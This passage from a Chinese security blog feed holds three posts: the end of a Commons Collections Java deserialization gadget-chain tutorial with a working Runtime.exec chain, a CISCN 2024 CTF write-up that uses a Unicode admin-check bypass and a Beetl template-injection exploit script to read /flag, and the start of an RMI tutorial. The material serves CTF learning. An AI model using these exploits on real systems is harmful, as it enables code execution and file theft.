class_">HashMap</span>&lt;&gt;();<br>            Map&lt;String, Integer&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>            Map&lt;String, Integer&gt; map1 = LazyMap.decorate(hashMap1, chain);<br>            map1.put(<span class="hljs-string">&quot;00&quot;</span>, <span class="hljs-number">1</span>);<br>            Map&lt;String, Integer&gt; map2 = LazyMap.decorate(hashMap2, chain);<br>            map2.put(<span class="hljs-string">&quot;.n&quot;</span>, <span class="hljs-number">1</span>);<br>            Hashtable&lt;Map&lt;String, Integer&gt;, Integer&gt; hashtable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>            hashtable.put(map1, <span class="hljs-number">1</span>);<br>            hashtable.put(map2, <span class="hljs-number">1</span>);<br>            map2.remove(<span class="hljs-string">&quot;00&quot;</span>);<br>            deserialize(serialize(hashtable));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">it_exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct, it1, it2, it_exec&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>             <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos)) &#123;<br>            oos.writeObject(obj);<br>            <span class="hljs-keyword">return</span> baos.toByteArray();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes))) &#123;<br>            ois.readObject();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728232439088.png" alt="image-20240728232439088"></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><img src="/2024/07/28/Commons-Collections/image-20240728233307715.png" class="" title="image-20240728233307715"><p>由此CC链告一段落，CB链随缘再讲吧。</p><p>看完CC链只能说反序列化初步入门，实战调链子也会后续一步步写上的。</p><p>我一定要成为Java高手！！！！</p><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/">https://p4d0rn.gitbook.io/java/serial-journey/commons-collection/</a></p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">https://wx.zsxq.com/dweb2/index/tags/Java安全漫谈/551511412514</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/125631391">Javaweb安全——反序列化漏洞-commons-collections4利用链（CC2和CC4）-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/127580121?ops_request_misc=%7B%22request_id%22:%22172217921116800225595414%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172217921116800225595414&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-127580121-null-null.nonecase&utm_term=CC5">Javaweb安全——反序列化漏洞-CC&amp;CB链思路整理-CSDN博客</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/16141397.html#commonscollections5">Java反序列化从URLDNS到CommonsCollections1-7 - KingBridge - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2024-Final-AWDP-Fobee</title>
    <link href="/2024/07/28/CISCN2024-Final-AWDP-Fobee/"/>
    <url>/2024/07/28/CISCN2024-Final-AWDP-Fobee/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次国赛算是爆种了，拿下了全国总冠军。</p><p><a href="https://mp.weixin.qq.com/s/HEdvNGKRnd0XBJwR8zAi4Q">微信公众平台 (qq.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004124171.png" alt="image-20240728004124171"></p><p>算是让天枢后继有人了吧。</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004719598.png" alt="image-20240728004719598"></p><p>（领奖的那位是我hhhhh，在左二挨着川大网安院院长）</p><p>主要还是第二天的渗透比较适合我吧哈哈，天时地利人和，队友也很给力，最后直接一鼓作气冲到了榜首😀</p><p>渗透的wp不打算写，反正网上也有打的比我多一道题的写了wp，我们渗透是并列第二，据说云镜会上，到时候再看看能不能冲下DC了却当时的遗憾。</p><p>第一天的awdp的web，我就修了一个solon-master，那道的fix很简单，因为lib里可以发现snakeyaml和logback，直接把关键字snake和log给ban掉就可以了，然后我过滤得更狠，直接什么@、$、&lt; 这些常见打json格式的反序列化符号给ban了，所以意外的第三轮就拿下了fix，并列二血fix吧算，近乎是吃满了check🤭🤭🤭</p><p>唯独这个Fobee让我头疼，当时我几乎后面几个小时都在看这个，然而修出来的也只有几个队，打出来的也不过三个数。</p><p>其中一个打法是学长给的，这里做一下浅浅的复现（学长tql呜呜呜呜）</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先是看看代码逻辑：</p><p><strong>IndexController.java</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fobee;<br><br><span class="hljs-keyword">import</span> java.security.MessageDigest;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> org.beetl.core.BeetlKit;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Controller;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Mapping;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.ModelAndView;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHARACTERS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> generateRandomString(<span class="hljs-number">10</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">index</span><span class="hljs-params">(String username)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;index.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;=====&quot;</span> + password + <span class="hljs-string">&quot;=====&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/render&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">render</span><span class="hljs-params">(String pass, String tp)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;render.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pass != <span class="hljs-literal">null</span> &amp;&amp; pass.equals(password)) &#123;<br>            <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br>            System.out.println(result);<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, getMD5Hash(result));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;Render Page&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> model;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/env&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">env</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateRandomString</span><span class="hljs-params">(<span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> random.nextInt(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.length());<br>            sb.append(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.charAt(index));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getMD5Hash</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;<br>        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>        md.update(input.getBytes());<br>        <span class="hljs-type">byte</span>[] digest = md.digest();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">byte</span>[] var4 = digest;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> digest.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> var4[var6];<br>            sb.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, b &amp; <span class="hljs-number">255</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这几个路由基本一目了然，首先是要知道这个ModelAndView的默认传参是GET，传参都搞不明白基本可以告别了。</p><p>首先进去的根路由是需要你传参username，但是要满足：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)<br></code></pre></td></tr></table></figure><p>本来fix我是想下面反序列化修不动，在这里过滤狠一点，但是当然也是check不过。</p><p>它又要你是admin，又要你toLowerCase绕过不是admin，那怎么绕？？？</p><p>其实你打开IDEA，拖过去到toLowerCase，它自己就告诉你了：</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728001510929.png" alt="image-20240728001510929"></p><p>这个locale的不一致会导致一个字符有多种识别方式，这里就告诉你了 <strong>i</strong> 在LATIN SMALL LETTER重等效于 <strong>\u0131</strong> ,其实不需要深入理解，这里就能绕了，进去后就能那道password的回显。</p><p>我们接着看路由，下面的render路由，很容易看到attack的点在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br></code></pre></td></tr></table></figure><p>首先是base64解密传参的tp，然后调用到BeetlKit.render进行渲染，其实应该就是个SSTI。</p><p>但是进入这里需要password，而上面若绕进去了就拿到了password，所以基本上就完成了。</p><p>怎么打SSTI呢，我们解包一下这个BeetlKit跟进一下：</p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002111368.png" class="" title="image-20240728002111368"><p>一个打模板注入的地方。</p><p>然而好像没有什么用，看不出来他要干啥，具体原理这里有篇文章可以看看：</p><p><a href="https://xz.aliyun.com/t/8695?time__1311=n4+xnD0DcDu7G=DCzGkDlhje3iKt4Y5feeEd4x">一次意外的代码审计—-JfinalCMS审计 - 先知社区 (aliyun.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002358967.png" alt="image-20240728002358967"></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002405853.png" alt="image-20240728002405853"></p><p>这下SSTI会打了，其实就是利用这个接口实现恶意类加载，但是beetlKit过滤得有点狠，常规的直接打runtime行不通。</p><p>所以需要找到它内部什么玩意能调用runtime打成功，学长找到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.antlr.v4.runtime.misc.Utils.readFile<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002829857.png" alt="image-20240728002829857"></p><p>显然这里可以直接读文件，但是回显需要类似盲注的手段，一个个字符读出来（tql学长wwwww），然后下面它会自己把读到的东西进行MD5加密并打在网页上。</p><p>这个&#x2F;env也可以看一下，反正都是jdk1.8所以意义不大。</p><p>所以思路就有了：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>、 根路由<span class="hljs-keyword">admin</span>绕过拿<span class="hljs-keyword">password</span><br><span class="hljs-number">2</span>、 带<span class="hljs-keyword">password</span>访问/render，tp使用base64加密的恶意注入payload读flag，由MD5格式爆出<br><span class="hljs-number">3</span>、 MD5一个个字符爆破<br></code></pre></td></tr></table></figure><p>看起来还挺简单，但是断网环境确实很折磨，总有那么几个环境问题，而且审计需要靠自己，比赛也很紧张，所以做出来的人确实很牛至了。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>这里我在vps上自搭环境测试：</p><p>先admin绕过，但是要url编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">&lt;url&gt;/?username=adm%C4%B1n<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003302893.png" alt="image-20240728003302893"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> hashlib<br><br>hash_string = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100000</span>):<br>    payload = base64.b64encode((<span class="hljs-string">&#x27;$&#123;@java.util.Arrays.toString(@org.antlr.v4.runtime.misc.Utils.readFile(&quot;/flag&quot;)).charAt(&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;)&#125;&#x27;</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    rsp = requests.get(<span class="hljs-string">f&#x27;http://vps:8888/render?pass=FuTKLliOry&amp;tp=<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>)<br>    soup = BeautifulSoup(rsp.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    md5_element = soup.select_one(<span class="hljs-string">&#x27;div#title-desktop&#x27;</span>)<br>    <span class="hljs-keyword">if</span> md5_element <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        md5val = md5_element.text<br>        <span class="hljs-built_in">print</span>(md5val)<br>        hash_string.append(md5val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>hash_string = <span class="hljs-string">&#x27;\n&#x27;</span>.join(hash_string)<br><br><span class="hljs-built_in">map</span> = <span class="hljs-built_in">dict</span>()<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:<br>    <span class="hljs-built_in">map</span>[hashlib.md5(c.encode()).hexdigest()] = c<br><br>val = hash_string.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(val))<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> cc <span class="hljs-keyword">in</span> val:<br>    <span class="hljs-keyword">if</span> cc <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>        flag += <span class="hljs-built_in">map</span>[cc]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>然后读文件一个个字符MD5爆破：</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003427355.png" alt="image-20240728003427355"></p><p>在此佩服一下学长的牛至做法，比赛场上俩学长都用类似这种方法做的，都tql~~~orz</p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2024/07/18/RMI-JNDI/"/>
    <url>/2024/07/18/RMI-JNDI/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先了解一下啥是RMI。</p><p><code>RMI：Remote Method Invocation</code> 远程方法调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">RMI为应用提供了远程调用的接口（Java的RPC框架）<br>调用远程位置对象的方法<br>实现RMI的协议叫JRMP<br>RMI实现过程存在Java对象的传递，因此涉及到反序列化<br></code></pre></td></tr></table></figure><p>基本上从java反序列化取经出来，遇到且绕不开的应该是各个CC链，而且很多的java反序列化非常具有缝合怪的风格，在前期学业压力下没办法系统归纳，知识也零零散散，这里就做一个系统化的复盘。</p><p>但是CC链太具有代表性了，所以我想先写写我第一次打到java题的时候遇到的RMI&#x2F;JNDI问题，就是NCTF2023的logging签到题，那道log4j虽然很简单地打accept头就能RCE，但是起的工具也就是JNDI注入的工具，所以让我记忆犹新。</p><p>然而光靠工具小子当然是不能解决问题的，大多是的EXP都是现场动调而手导手写，而且线下断网环境注定不能反弹shell而则必须使用内存马也使得java在web题内最少解的情况，国赛也遇到了触目惊心的零解。反射和类加载我就不再赘述，因为这算是最基本的java反序列化入门知识。</p><p>为屏蔽网络通信的复杂性，RMI引入两个概念，客户端存根Stub和服务端骨架Skeleton</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">当<span class="hljs-variable">Client</span>试图调用一个远端的<span class="hljs-variable">Object</span>，实际调用的是客户端本地的一个代理类（就是<span class="hljs-built_in">Stub</span>）<br><br>调用<span class="hljs-variable">Server</span>的目标类之前，会经过一个远端代理类（就是<span class="hljs-built_in">Skeleton</span>），它从<span class="hljs-built_in">Stub</span>接收远程方法调用并传递给真正的目标类<br><br><span class="hljs-built_in">Stub</span>和<span class="hljs-built_in">Skeleton</span>的调用对于<span class="hljs-variable">RMI</span>服务的使用者是隐藏的<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/1.png" alt="1"></p><p><img src="/2024/07/18/RMI-JNDI/2.png" alt="2"></p><p><strong>代码规则</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">客户端和服务端都需定义用于远程调用的接口<br><br>接口必须继承`java.rmi.Remote`接口<br><br>接口中的方法都要抛出`java.rmi.RemoteException`异常<br><br>服务端创建接口实现类，实现接口定义的方法<br><br>实现类继承`java.rmi.server.UnicastRemoteObject`<br></code></pre></td></tr></table></figure><p>这里要求实现类继承<code>UnicastRemoteObject</code>，方便自动将这个远程对象导出供客户端调用</p><p>当然不继承也行，但后面得手动调用<code>UnicastRemoteObject#exportObject</code>，导出对象时可以指定监听端口来接收<code>incoming calls</code>，默认为随机端口。由上图可知远程对象会被注册到<code>RMI Registry</code>中，所以实际上不需要通过注册中心，只要我们知道导出的远程对象监听的端口号，也可以和它直接通信。</p><p><code>RMI Registry</code>注册中心存储着远程对象的引用（Reference）和其绑定的名称（Name），客户端通过名称找到远程对象的引用（Reference），再由这个引用就可以调用到远程对象了。</p><h2 id="步骤代码"><a href="#步骤代码" class="headerlink" title="步骤代码"></a>步骤代码</h2><p><strong>Server</strong></p><p>需要远程调用的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span 